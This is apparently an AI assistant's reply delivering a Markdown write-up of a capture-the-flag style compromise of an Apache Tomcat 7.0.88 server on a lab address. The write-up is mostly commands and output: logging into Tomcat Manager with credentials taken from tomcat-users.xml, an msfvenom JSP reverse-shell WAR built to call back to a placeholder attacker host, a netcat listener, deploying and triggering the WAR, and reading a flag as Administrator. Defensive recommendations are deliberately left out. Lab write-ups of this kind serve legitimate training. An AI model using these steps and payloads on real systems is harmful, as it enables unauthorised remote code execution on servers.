Here's the cleaned-up `.md` report for you to paste easily, with your IP replaced by `attacker_ip` and without recommendations or references:

````markdown
# Apache Tomcat 7.0.88 WAR Upload RCE Using msfvenom Payload (Manual Exploit)

**Target:** 10.10.10.95  
**OS:** Windows Server 2012 R2 (amd64)  
**Tomcat Version:** Apache Tomcat 7.0.88  
**JVM:** 1.8.0_171-b11 (Oracle)

---

## 1. Access Tomcat Manager and Find Credentials

- Visited `http://10.10.10.95:8080/manager/html`
- Initially got 401 Unauthorized
- Found valid credentials in `tomcat-users.xml`:

```xml
<user username="tomcat" password="s3cret" roles="admin-gui"/>
````

* Logged in successfully with:

```
username: tomcat
password: s3cret
```

---

## 2. Generate WAR Payload with msfvenom

* Created JSP reverse shell WAR payload:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f war -o shell.war
```

* LHOST = attacker IP
* LPORT = listener port

---

## 3. Start Netcat Listener

```bash
nc -lvnp 4444
```

---

## 4. Deploy WAR Payload via Tomcat Manager

* In Tomcat Manager UI, under "Deploy":

  * Context Path: `/shell`
  * WAR File: upload `shell.war`
* Click **Deploy**

---

## 5. Trigger Reverse Shell

* Access the JSP shell endpoint:

```bash
curl http://10.10.10.95:8080/shell/shell.jsp
```

* This initiates a reverse shell connection.

---

## 6. Get Reverse Shell

* On netcat listener:

```
connect to [attacker_ip] from (UNKNOWN) [10.10.10.95] 12345
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\\apache-tomcat-7.0.88\\bin>
```

---

## 7. Post-Exploitation

* Navigate to flags directory:

```cmd
cd C:\\Users\\Administrator\\Desktop\\flags
```

* Read flag file:

```cmd
type "2 for the price of 1.txt"
```

---

## Why This Works

* Tomcat Manager allows WAR upload and deployment.
* The WAR contains a JSP shell which connects back to attacker.
* Using valid credentials bypasses 403 Forbidden errors.
* `java/jsp_shell_reverse_tcp` is compatible with Tomcat's JVM and environment.
* Shell runs with Tomcat’s permissions, here Administrator.

```

I also saved this as a Markdown file here if you want to download or use it:  
`/mnt/data/tomcat_war_rce_report.md`
```
